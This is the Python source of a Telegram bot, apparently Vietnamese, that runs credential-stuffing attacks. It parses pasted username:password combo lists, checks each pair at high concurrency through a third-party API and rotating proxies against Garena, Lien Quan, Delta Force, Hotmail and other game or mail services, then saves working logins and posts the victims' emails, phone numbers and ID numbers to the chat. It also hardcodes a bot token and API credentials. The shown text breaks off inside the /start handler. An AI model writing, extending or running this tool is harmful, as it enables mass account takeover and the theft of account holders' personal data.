import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import telebot
import requests
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import random

def install_package(package_name):
    """Cài đặt package nếu chưa có"""
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

# ========== FIX CHO RENDER WEB SERVICE ==========
import os as os_module
import threading as threading_module
from http.server import HTTPServer, BaseHTTPRequestHandler

class RenderHandler(BaseHTTPRequestHandler):
    """Xử lý HTTP request để Render giữ bot sống"""
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = """<!DOCTYPE html>
<html>
<head><title>Garena Checker Bot</title></head>
<body style="font-family:Arial;text-align:center;padding:50px;background:#0a0a0a;color:#00ff00;">
<h1>Garena Checker Bot V4.8</h1>
<p>Status: <b style="color:#00ff00;">ALIVE</b></p>
<p>Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;">@baohuyno1</a></p>
<p>Version: <b>4.8 - CHECK FIX</b></p>
</body>
</html>"""
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/ping':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"pong")
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
    
    def log_message(self, format, *args):
        pass

def start_render_server():
    """Khởi động HTTP server cho Render"""
    try:
        port = int(os_module.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), RenderHandler)
        print(f"[*] Render web server chay tren port {port}")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Loi web server: {e}")

threading_module.Thread(target=start_render_server, daemon=True).start()
# ==============================================

# ========== CẤU HÌNH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"

# Kênh bắt buộc phải tham gia
REQUIRED_CHANNEL = "@hakiiosvip"
REQUIRED_CHANNEL_ID = "@hakiiosvip"
REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 100
DEFAULT_TIMEOUT = 60
DEFAULT_RETRIES = 3

OUTPUT_HITS = "hits.txt"
OUTPUT_DEAD = "dead.txt"
OUTPUT_UNKNOWN = "unknown.txt"
OUTPUT_ERROR = "error.txt"
OUTPUT_RESULT = "result_full.txt"
OUTPUT_LOC = "loc_accounts.txt"
OUTPUT_PROXY = "proxy.txt"

MAX_MESSAGE_LENGTH = 4000

# ========== DANH SÁCH SERVICE ==========
SERVICE_ROUTES = {
    "lienquan": {
        "route": "/api/lienquan",
        "desc": "Lien Quan + FC Online",
        "icon": "🎮",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    },
    "miniworld": {
        "route": "/api/miniworld",
        "desc": "Mini World",
        "icon": "🌍",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "blockmango": {
        "route": "/api/blockmango",
        "desc": "Blockman Go",
        "icon": "🧱",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "deltaforce": {
        "route": "/api/deltaforce",
        "desc": "Delta Force",
        "icon": "🔫",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    },
    "hotmail": {
        "route": "/api/hotmail",
        "desc": "Hotmail",
        "icon": "📧",
        "params": ["tk", "mk"],
        "extra_params": {"keyword": ""}
    },
    "fc": {
        "route": "/api/fc",
        "desc": "FC Online",
        "icon": "⚽",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    },
    "fullpack": {
        "route": "/api/fullpack",
        "desc": "Fullpack (Tat ca)",
        "icon": "📦",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    }
}

# ========== BIẾN TOÀN CỤC ==========
checking = False
stop_event = threading.Event()
pending_accounts = {}
proxy_list = []
proxy_lock = threading.Lock()
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
bot_start_time = datetime.now()
cache_results = {}
cache_lock = threading.Lock()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

# ========== KIỂM TRA THÀNH VIÊN KÊNH ==========
def is_user_member(user_id):
    """Kiểm tra user có tham gia kênh bắt buộc không"""
    try:
        chat_member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        status = chat_member.status
        if status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        print(f"[!] Loi kiem tra thanh vien: {e}")
        return False

def check_membership(message):
    """Kiểm tra và gửi thông báo yêu cầu tham gia kênh"""
    user_id = message.from_user.id
    if is_user_member(user_id):
        return True
    
    # Tạo nút bấm tham gia kênh
    markup = telebot.types.InlineKeyboardMarkup()
    join_button = telebot.types.InlineKeyboardButton(
        text="📢 THAM GIA KÊNH BẮT BUỘC",
        url=REQUIRED_CHANNEL_URL
    )
    check_button = telebot.types.InlineKeyboardButton(
        text="✅ TÔI ĐÃ THAM GIA",
        callback_data="check_join"
    )
    markup.add(join_button)
    markup.add(check_button)
    
    safe_send_message(
        message.chat.id,
        f"""
🔒 <b>BẠN CHƯA THAM GIA KÊNH BẮT BUỘC!</b>

📢 Vui lòng tham gia kênh sau để sử dụng bot:
👉 <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>

Sau khi tham gia, bấm nút bên dưới để xác nhận!
""",
        parse_mode="HTML"
    )
    
    try:
        bot.send_message(message.chat.id, "👇 Xác nhận sau khi tham gia:", reply_markup=markup)
    except:
        pass
    
    return False

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_check_join(call):
    """Xử lý nút xác nhận đã tham gia kênh"""
    user_id = call.from_user.id
    
    if is_user_member(user_id):
        bot.answer_callback_query(call.id, "✅ Xác nhận thành công! Bạn có thể sử dụng bot.")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        safe_send_message(
            call.message.chat.id,
            f"""
✅ <b>XÁC NHẬN THÀNH CÔNG!</b>

Chào mừng bạn đến với bot!
Dùng /start để xem hướng dẫn sử dụng.
"""
        )
    else:
        bot.answer_callback_query(call.id, "❌ Bạn chưa tham gia kênh!", show_alert=True)
        safe_send_message(
            call.message.chat.id,
            f"""
❌ <b>BẠN CHƯA THAM GIA KÊNH!</b>

Vui lòng tham gia: <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>
Sau đó bấm nút xác nhận lại.
"""
        )

# ========== DECORATOR KIỂM TRA THÀNH VIÊN ==========
def require_membership(func):
    """Decorator yêu cầu phải là thành viên kênh"""
    def wrapper(message, *args, **kwargs):
        if check_membership(message):
            return func(message, *args, **kwargs)
        return None
    return wrapper

# ========== HÀM GỬI TIN NHẮN ==========
def safe_send_message(chat_id, text, parse_mode="HTML"):
    """Gửi tin nhắn an toàn"""
    if not text:
        return
    
    if len(text) > MAX_MESSAGE_LENGTH:
        parts = []
        current_part = ""
        lines = text.split('\n')
        
        for line in lines:
            if len(current_part) + len(line) + 1 > MAX_MESSAGE_LENGTH:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        
        if current_part:
            parts.append(current_part)
        
        for part in parts:
            try:
                bot.send_message(chat_id, part.strip(), parse_mode=parse_mode)
                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Loi gui tin nhan: {e}")
    else:
        try:
            bot.send_message(chat_id, text, parse_mode=parse_mode)
        except Exception as e:
            print(f"[!] Loi gui tin nhan: {e}")

# ========== QUẢN LÝ PROXY ==========
def load_proxy_from_text(content):
    """Load proxy từ text"""
    global proxy_list
    
    proxies = []
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        parts = line.split(':')
        if len(parts) == 2:
            ip, port = parts
            if is_valid_ip_port(ip, port):
                proxies.append({
                    "ip": ip,
                    "port": port,
                    "user": "",
                    "password": "",
                    "full": f"{ip}:{port}"
                })
        elif len(parts) == 4:
            ip, port, user, password = parts
            if is_valid_ip_port(ip, port):
                proxies.append({
                    "ip": ip,
                    "port": port,
                    "user": user,
                    "password": password,
                    "full": f"{ip}:{port}:{user}:{password}"
                })
    
    with proxy_lock:
        proxy_list = proxies
    
    return len(proxies)

def is_valid_ip_port(ip, port):
    """Kiểm tra ip và port hợp lệ"""
    try:
        port_num = int(port)
        if port_num < 1 or port_num > 65535:
            return False
        
        ip_parts = ip.split('.')
        if len(ip_parts) == 4:
            for part in ip_parts:
                num = int(part)
                if num < 0 or num > 255:
                    return False
            return True
        
        if re.match(r'^[a-zA-Z0-9.-]+$', ip):
            return True
        
        return False
    except:
        return False

def get_random_proxy():
    """Lấy proxy ngẫu nhiên"""
    with proxy_lock:
        if not proxy_list:
            return None
        return random.choice(proxy_list)

def build_proxy_string(proxy):
    """Tạo chuỗi proxy cho API"""
    if not proxy:
        return ""
    
    if proxy["user"] and proxy["password"]:
        return f"{proxy['user']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}"
    else:
        return f"{proxy['ip']}:{proxy['port']}"

def save_proxy_file():
    """Lưu danh sách proxy vào file"""
    with file_lock:
        with open(OUTPUT_PROXY, 'w', encoding='utf-8') as f:
            with proxy_lock:
                for proxy in proxy_list:
                    f.write(f"{proxy['full']}\n")

# ========== LỌC TK MK - HỖ TRỢ | VÀ : ==========
def loc_tk_mk_only(content):
    """Lọc tài khoản chuyên nghiệp, hỗ trợ | và :"""
    accounts = []
    seen = set()
    stats_loc = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
    
    if not content:
        return accounts, stats_loc
    
    # Pattern cho dấu : (user:pass)
    pattern_colon = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@-]{1,50}):([a-zA-Z0-9_.@!$%^&*()\-]{1,100})(?![a-zA-Z0-9_])'
    
    # Pattern cho dấu | (user|pass)
    pattern_pipe = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@-]{1,50})\|([a-zA-Z0-9_.@!$%^&*()\-]{1,100})(?![a-zA-Z0-9_])'
    
    # Pattern FINAL = user:pass
    pattern_final = r'FINAL\s*[=:]\s*([a-zA-Z0-9][a-zA-Z0-9_.@-]{1,50})[:|]([a-zA-Z0-9_.@!$%^&*()\-]{1,100})'
    
    skip_patterns = [
        r'^https?://', r'^www\.', r'\.com$', r'\.net$', r'\.org$',
        r'^shop', r'^share', r'^final', r'^name', r'^level', r'^rank',
        r'^status', r'^time', r'^date', r'^email', r'^phone', r'^sdt',
        r'^cccd', r'^fb', r'^ban', r'^ss', r'^sss', r'^anime', r'^other',
        r'^tinh', r'^quan_huy', r'^lich_su', r'^vo_game', r'^quoc_gia',
        r'^tuong', r'^skin', r'^authen', r'^so:', r'^qu[âa]n', r'^v[ôo]'
    ]
    
    # Thử FINAL pattern trước
    final_matches = re.findall(pattern_final, content, re.IGNORECASE)
    if final_matches:
        for user, pwd in final_matches:
            key = f"{user}:{pwd}"
            if key not in seen and is_valid_account(user, pwd, skip_patterns):
                seen.add(key)
                accounts.append((user, pwd))
                stats_loc["valid"] += 1
            elif key in seen:
                stats_loc["duplicate"] += 1
            else:
                stats_loc["invalid"] += 1
        stats_loc["total"] = len(final_matches)
        return accounts, stats_loc
    
    lines = content.split('\n')
    stats_loc["total"] = len(lines)
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        # Thử pattern dấu : trước
        matches = re.findall(pattern_colon, line)
        if matches:
            for user, pwd in matches:
                if is_valid_account(user, pwd, skip_patterns):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
            continue
        
        # Thử pattern dấu |
        matches = re.findall(pattern_pipe, line)
        if matches:
            for user, pwd in matches:
                if is_valid_account(user, pwd, skip_patterns):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
    
    # Nếu không tìm thấy, thử tìm trong toàn bộ nội dung
    if not accounts:
        all_matches = re.findall(pattern_colon, content)
        for user, pwd in all_matches:
            if is_valid_account(user, pwd, skip_patterns):
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((user, pwd))
                    stats_loc["valid"] += 1
                else:
                    stats_loc["duplicate"] += 1
            else:
                stats_loc["invalid"] += 1
        
        if not accounts:
            all_matches = re.findall(pattern_pipe, content)
            for user, pwd in all_matches:
                if is_valid_account(user, pwd, skip_patterns):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
    
    return accounts, stats_loc

def is_valid_account(user, pwd, skip_patterns):
    """Kiểm tra tài khoản hợp lệ"""
    if len(user) < 2 or len(pwd) < 1:
        return False
    
    if len(user) > 50 or len(pwd) > 100:
        return False
    
    user_lower = user.lower()
    for pattern in skip_patterns:
        if re.match(pattern, user_lower):
            return False
    
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9_.@-]*$', user):
        return False
    
    if not re.match(r'^[a-zA-Z0-9_.@!$%^&*()\-]+$', pwd):
        return False
    
    if user.lower() in ['http', 'https', 'www', 'com', 'net', 'org', 'shop', 'share', 'final', 'name', 'level', 'rank', 'status', 'time', 'date', 'email', 'phone', 'sdt', 'cccd', 'fb', 'ban', 'ss', 'sss', 'anime', 'other']:
        return False
    
    return True

# ========== LƯU FILE ==========
def save_loc_file(accounts):
    """Lưu danh sách đã lọc vào file"""
    with file_lock:
        with open(OUTPUT_LOC, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")

def save_result(username, password, status, service=""):
    """Lưu kết quả vào các file"""
    with file_lock:
        if status == "hit":
            with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        elif status == "dead":
            with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        elif status == "unknown":
            with open(OUTPUT_UNKNOWN, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        else:
            with open(OUTPUT_ERROR, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        
        with open(OUTPUT_RESULT, 'a', encoding='utf-8') as f:
            f.write(f"{username}:{password}|{status}|{service}\n")

# ========== CHECK API ==========
def check_account_api(username, password, service):
    """Gọi API kiểm tra tài khoản"""
    cache_key = f"{username}:{password}:{service}"
    with cache_lock:
        if cache_key in cache_results:
            return cache_results[cache_key]
    
    service_info = SERVICE_ROUTES.get(service, {})
    route = service_info.get("route", "/api/lienquan")
    param_names = service_info.get("params", ["tk", "mk"])
    extra_params = service_info.get("extra_params", {})
    
    url = f"{API_BASE}{route}"
    
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD
    }
    
    if len(param_names) >= 2:
        params[param_names[0]] = username
        params[param_names[1]] = password
    else:
        params["tk"] = username
        params["mk"] = password
    
    proxy = get_random_proxy()
    if proxy:
        proxy_str = build_proxy_string(proxy)
        if "proxy" in extra_params or service in ["lienquan", "deltaforce", "fc", "fullpack"]:
            params["proxy"] = proxy_str
    else:
        for key, value in extra_params.items():
            params[key] = value
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Connection": "keep-alive"
    }
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    result_data = resp.json()
                    
                    if isinstance(result_data, dict):
                        is_hit = False
                        
                        status_val = result_data.get("status")
                        if status_val is not None:
                            if status_val in [True, "true", 1, "1", "True", "TRUE", "success", "Success", "SUCCESS"]:
                                is_hit = True
                            elif status_val in [False, "false", 0, "0", "False", "FALSE", "fail", "Fail", "FAIL", "dead", "Dead", "DEAD"]:
                                is_hit = False
                        
                        success_val = result_data.get("success")
                        if not is_hit and success_val is not None:
                            if success_val in [True, "true", 1, "1", "True", "TRUE"]:
                                is_hit = True
                            elif success_val in [False, "false", 0, "0", "False", "FALSE"]:
                                is_hit = False
                        
                        result_val = result_data.get("result")
                        if result_val is not None:
                            result_str = str(result_val).lower()
                            if result_str in ["hit", "true", "success", "valid", "1", "live", "ok"]:
                                is_hit = True
                            elif result_str in ["dead", "false", "fail", "invalid", "0", "die", "error"]:
                                is_hit = False
                        
                        message_val = result_data.get("message", "")
                        if message_val:
                            msg_lower = str(message_val).lower()
                            if any(word in msg_lower for word in ["thành công", "thanh cong", "success", "valid", "hit", "đúng", "dung", "live", "ok"]):
                                is_hit = True
                            elif any(word in msg_lower for word in ["thất bại", "that bai", "fail", "invalid", "dead", "sai", "không đúng", "khong dung", "die", "error"]):
                                is_hit = False
                        
                        data_val = result_data.get("data")
                        if data_val is not None:
                            if isinstance(data_val, (dict, list, str)) and data_val:
                                is_hit = True
                        
                        info_fields = ["uid", "id", "name", "nickname", "account", "info", "user", "player", "level", "rank", "email", "phone", "sdt"]
                        for field in info_fields:
                            if field in result_data and result_data[field] is not None and result_data[field] != "":
                                is_hit = True
                                break
                        
                        result_data["result"] = "hit" if is_hit else "dead"
                        
                        with cache_lock:
                            cache_results[cache_key] = result_data
                        return result_data
                    else:
                        result = {"result": "unknown"}
                        with cache_lock:
                            cache_results[cache_key] = result
                        return result
                        
                except json.JSONDecodeError:
                    text_lower = resp.text.lower()
                    if any(word in text_lower for word in ["success", "ok", "true", "hit", "valid", "live"]):
                        result = {"result": "hit"}
                    elif any(word in text_lower for word in ["fail", "false", "dead", "invalid", "error", "die"]):
                        result = {"result": "dead"}
                    else:
                        result = {"result": "unknown"}
                    
                    with cache_lock:
                        cache_results[cache_key] = result
                    return result
                    
            elif resp.status_code == 429:
                retry_after = resp.headers.get("Retry-After", "5")
                try:
                    wait_time = int(retry_after)
                except:
                    wait_time = 5 * (attempt + 1)
                time.sleep(wait_time)
                continue
            elif resp.status_code == 401:
                result = {"result": "error", "_error": "Invalid API credentials"}
                with cache_lock:
                    cache_results[cache_key] = result
                return result
            elif resp.status_code == 403:
                result = {"result": "error", "_error": "Forbidden access"}
                with cache_lock:
                    cache_results[cache_key] = result
                return result
            else:
                time.sleep(2)
                continue
                
        except requests.exceptions.Timeout:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(3)
                continue
        except requests.exceptions.ConnectionError:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(5)
                continue
        except Exception:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(3)
                continue
    
    result = {"result": "error", "_error": "All retries failed"}
    with cache_lock:
        cache_results[cache_key] = result
    return result

# ========== FORMAT THÔNG TIN ĐẸP ==========
def format_hit_info(username, password, service, result_data):
    """Format thông tin hit đẹp"""
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
    
    line = "━━━━━━━━━━━━━━━━━━━━━━"
    
    msg = f"{line}\n{icon} <b>HIT - {service_desc}</b>\n{line}\n"
    msg += f"🔑 <b>Account:</b> <code>{username}:{password}</code>\n"
    
    if isinstance(result_data, dict):
        # Map field names to labels with icons
        field_map = {
            "uid": ("👤 UID", "uid"),
            "name": ("👤 Name", "name"),
            "nickname": ("👤 Nickname", "nickname"),
            "region": ("🌐 Region", "region"),
            "shells": ("💰 Shells", "shells"),
            "so": ("💲 Sò", "so"),
            "nap_so": ("💰 Nạp sò", "nap_so"),
            "email": ("📧 Email", "email"),
            "email_verified": ("📧 Email Verified", "email_verified"),
            "phone": ("📱 SĐT", "phone"),
            "sdt": ("📱 SĐT", "sdt"),
            "mobile_bound": ("📱 Mobile Bound", "mobile_bound"),
            "fb": ("🔗 FB", "fb"),
            "fb_linked": ("🔗 FB Linked", "fb_linked"),
            "password_set": ("🛡 PASS", "password_set"),
            "account_secured": ("🛡 Account Secured", "account_secured"),
            "banned": ("🚫 BAND", "banned"),
            "ban": ("🚫 BAND", "ban"),
            "last_login": ("⏰ Login cuối", "last_login"),
            "created_at": ("📅 Tạo GR", "created_at"),
            "server": ("🖥 Server", "server"),
            "aov_name": ("🔥 NAME", "aov_name"),
            "aov_rank": ("👑 RANK", "aov_rank"),
            "aov_level": ("✨ LEVEL", "aov_level"),
            "aov_total_skins": ("💎 SKIN", "aov_total_skins"),
            "aov_total_heroes": ("💪 HERO", "aov_total_heroes"),
            "aov_total_relationships": ("⚡️ QH", "aov_total_relationships"),
            "cccd": ("📄 CCCD", "cccd"),
            "authen": ("🛡 Authen", "authen"),
            "ss_4": ("✦ SS(4)", "ss_4"),
            "anime_1": ("✦ Anime(1)", "anime_1"),
            "tinh_trang": ("📋 Tình Trạng", "tinh_trang"),
            "status_account": ("📋 Tình Trạng", "status_account")
        }
        
        info_lines = []
        
        # Process known fields in order
        for key, (label, field) in field_map.items():
            if field in result_data and result_data[field] is not None and result_data[field] != "" and result_data[field] != "N/A":
                value = result_data[field]
                # Chuyển True/False thành YES/NO
                if isinstance(value, bool):
                    value = "YES" if value else "NO"
                elif isinstance(value, str) and value.lower() in ["true", "false"]:
                    value = "YES" if value.lower() == "true" else "NO"
                info_lines.append(f"{label}: {value}")
        
        # Process any remaining fields
        skip_fields = set(field_map.keys())
        skip_fields.update(["result", "_is_hit", "_raw_response", "_error", "status", "success", "tk", "mk", "data", "message"])
        
        for key, value in result_data.items():
            if key not in skip_fields and value is not None and value != "" and value != {} and value != []:
                if isinstance(value, (str, int, float)):
                    label = key.replace("_", " ").title()
                    # Chuyển True/False thành YES/NO
                    if isinstance(value, bool):
                        value = "YES" if value else "NO"
                    elif isinstance(value, str) and value.lower() in ["true", "false"]:
                        value = "YES" if value.lower() == "true" else "NO"
                    info_lines.append(f"🚫 BAND: {value}")
                elif isinstance(value, dict):
                    for sub_key, sub_value in value.items():
                        if sub_value is not None and sub_value != "" and sub_value != {} and sub_value != []:
                            if isinstance(sub_value, (str, int, float)):
                                sub_label = sub_key.replace("_", " ").title()
                                # Chuyển True/False thành YES/NO
                                if isinstance(sub_value, bool):
                                    sub_value = "YES" if sub_value else "NO"
                                elif isinstance(sub_value, str) and sub_value.lower() in ["true", "false"]:
                                    sub_value = "YES" if sub_value.lower() == "true" else "NO"
                                info_lines.append(f"🚫 BAND: {sub_value}")
        
        if info_lines:
            msg += "\n".join(info_lines)
            msg += f"\n{line}"
    
    return msg

def get_field_icon(field_name):
    """Lấy icon phù hợp cho từng field"""
    field_name_lower = field_name.lower()
    
    icon_map = {
        "uid": "🆔",
        "id": "🆔",
        "region": "🌏",
        "shells": "💰",
        "email_verified": "📧",
        "mobile_bound": "📱",
        "fb_linked": "👤",
        "account_secured": "🔒",
        "password_set": "🔐",
        "aov_name": "🎮",
        "aov_rank": "🏆",
        "aov_level": "📊",
        "aov_banned": "🚫",
        "aov_total_skins": "🎨",
        "name": "👤",
        "nickname": "👤",
        "account": "🔑",
        "info": "ℹ️",
        "user": "👤",
        "player": "🎮",
        "level": "📊",
        "rank": "🏆",
        "email": "📧",
        "phone": "📱",
        "sdt": "📱",
        "skin": "🎨",
        "skins": "🎨",
        "banned": "🚫",
        "ban": "🚫",
        "verified": "✅",
        "secured": "🔒",
        "password": "🔐",
        "proxy": "🌐",
        "ip": "🌐",
        "port": "🔌",
        "time": "⏱",
        "date": "📅",
        "status": "📊",
        "result": "📋",
        "message": "💬",
        "error": "⚠️",
        "success": "✅",
        "data": "📦"
    }
    
    return icon_map.get(field_name_lower, "🚫 BAND")

# ========== CHECK ĐƠN ==========
def check_single(chat_id, username, password, service="lienquan"):
    """Kiểm tra một tài khoản"""
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
    
    result = check_account_api(username, password, service)
    result_type = result.get("result", "unknown")
    
    save_result(username, password, result_type, service)
    
    if result_type == "hit":
        hit_msg = format_hit_info(username, password, service, result)
        safe_send_message(chat_id, hit_msg)
    elif result_type == "dead":
        safe_send_message(chat_id, f"❌ DEAD - {service_desc}\n🔑 {username}:{password}")
    else:
        safe_send_message(chat_id, f"⚠️ ERROR - {service_desc}\n🔑 {username}:{password}")

# ========== CHECK NHIỀU ==========
def check_batch(chat_id, accounts, service):
    """Kiểm tra nhiều tài khoản"""
    global checking, stats
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    checking = True
    stop_event.clear()
    
    total = len(accounts)
    stats = {
        "total": total,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "unknown": 0,
        "start_time": time.time()
    }
    
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
    
    with proxy_lock:
        proxy_count = len(proxy_list)
    
    safe_send_message(chat_id, f"""
{icon} <b>BAT DAU CHECK</b>
📊 Tong: <code>{total}</code> accounts
🎯 Service: <b>{service_desc}</b>
⚡ Threads: <code>{DEFAULT_THREADS}</code>
🌐 Proxy: <code>{proxy_count}</code>
""")
    
    def process_single(user, pwd):
        """Xử lý một tài khoản"""
        if stop_event.is_set():
            return
        
        result = check_account_api(user, pwd, service)
        result_type = result.get("result", "unknown")
        
        save_result(user, pwd, result_type, service)
        
        with stats_lock:
            stats["checked"] += 1
            
            if result_type == "hit":
                stats["hits"] += 1
                try:
                    hit_msg = format_hit_info(user, pwd, service, result)
                    safe_send_message(chat_id, hit_msg)
                except:
                    pass
            elif result_type == "dead":
                stats["dead"] += 1
            else:
                stats["errors"] += 1
            
            if stats["checked"] % 50 == 0:
                try:
                    elapsed = time.time() - stats["start_time"]
                    speed = stats["checked"] / elapsed if elapsed > 0 else 0
                    percent = (stats["checked"] / total) * 100
                    safe_send_message(chat_id, f"""
📊 <b>TIEN DO</b>
✅ Checked: <code>{stats['checked']}/{total}</code> ({percent:.1f}%)
🎯 Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
""")
                except:
                    pass
    
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(process_single, user, pwd): (user, pwd) 
                   for user, pwd in accounts}
        
        for future in as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break
    
    checking = False
    elapsed = time.time() - stats["start_time"]
    
    safe_send_message(chat_id, f"""
✅ <b>CHECK HOAN TAT!</b>
📊 Tong: <code>{stats['total']}</code>
🎯 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⏱ Thoi gian: <code>{elapsed:.1f}s</code>
""")
    
    if stats["hits"] > 0 and os.path.exists(OUTPUT_HITS):
        with open(OUTPUT_HITS, 'rb') as f:
            try:
                bot.send_document(chat_id, f, caption=f"✅ hits.txt ({stats['hits']} acc)")
            except:
                pass

# ========== CHECK ALL SERVICE ==========
def check_all_services(chat_id, accounts):
    """Kiểm tra tất cả service"""
    global checking
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    if not accounts:
        safe_send_message(chat_id, "❌ Khong co accounts!")
        return
    
    checking = True
    stop_event.clear()
    
    total_accounts = len(accounts)
    total_services = len(SERVICE_ROUTES)
    
    safe_send_message(chat_id, f"""
⚡ <b>CHECK TAT CA SERVICE</b>
📊 Accounts: <code>{total_accounts}</code>
📋 Services: <code>{total_services}</code>
""")
    
    stats_all = {
        "total": total_accounts * total_services,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time()
    }
    
    def process_all(user, pwd, service):
        """Xử lý một tài khoản với một service"""
        if stop_event.is_set():
            return
        
        result = check_account_api(user, pwd, service)
        result_type = result.get("result", "unknown")
        
        save_result(user, pwd, result_type, service)
        
        with stats_lock:
            stats_all["checked"] += 1
            if result_type == "hit":
                stats_all["hits"] += 1
                try:
                    hit_msg = format_hit_info(user, pwd, service, result)
                    safe_send_message(chat_id, hit_msg)
                except:
                    pass
            elif result_type == "dead":
                stats_all["dead"] += 1
            else:
                stats_all["errors"] += 1
    
    all_tasks = [(user, pwd, service) for user, pwd in accounts for service in SERVICE_ROUTES.keys()]
    
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(process_all, user, pwd, service): (user, pwd, service) 
                   for user, pwd, service in all_tasks}
        
        for future in as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break
    
    checking = False
    elapsed = time.time() - stats_all["start_time"]
    
    safe_send_message(chat_id, f"""
✅ CHECK ALL HOAN TAT!
🎯 Hits: {stats_all['hits']}
❌ Dead: {stats_all['dead']}
⏱ Time: {elapsed:.1f}s
""")

# ========== XỬ LÝ LỆNH ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    """Lệnh /start"""
    if not check_membership(message):
        return
    
    with proxy_lock:
        proxy_count = len(proxy_list)
    
    safe_send_message(message.chat.id, f"""
🤖 <b>GARENA CHECKER BOT V4.8</b>
👤 Admin: @baohuyno1
